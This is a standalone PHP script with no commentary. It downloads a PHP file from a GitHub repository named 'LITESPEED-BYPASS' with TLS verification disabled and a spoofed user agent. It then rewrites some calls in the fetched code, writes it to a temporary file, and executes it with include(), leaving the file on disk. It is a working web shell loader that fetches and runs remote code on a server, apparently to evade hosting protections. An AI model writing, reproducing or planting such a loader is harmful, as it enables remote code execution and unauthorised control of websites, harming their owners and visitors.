<?php
// Enable error reporting for debugging purposes
error_reporting(E_ALL);
ini_set('display_errors', 1);

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $url_get_contents_data = curl_exec($conn);
        if (curl_errno($conn)) {
            echo 'Curl error: ' . curl_error($conn);
            return false;
        }
        curl_close($conn);
        return $url_get_contents_data;
    } else {
        echo 'cURL is not available.';
        return false;
    }
}

// Directly execute the main content
$a = geturlsinfo('https://raw.githubusercontent.com/hacker-d/LITESPEED-BYPASS/main/style.php');
if ($a !== false) {
    // Optionally modify the content to replace file_get_contents with cURL if found
    // Example: $a = str_replace('file_get_contents(', 'custom_get_contents(', $a);
    $a = str_replace('file_get_contents', 'custom_get_contents', $a);

    // Define custom_get_contents to use cURL
    function custom_get_contents($url) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

    $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
    file_put_contents($tmp_file, $a);
    include($tmp_file);
    // Do not delete the temporary file
} else {
    echo "Failed to retrieve content.";
}
?>
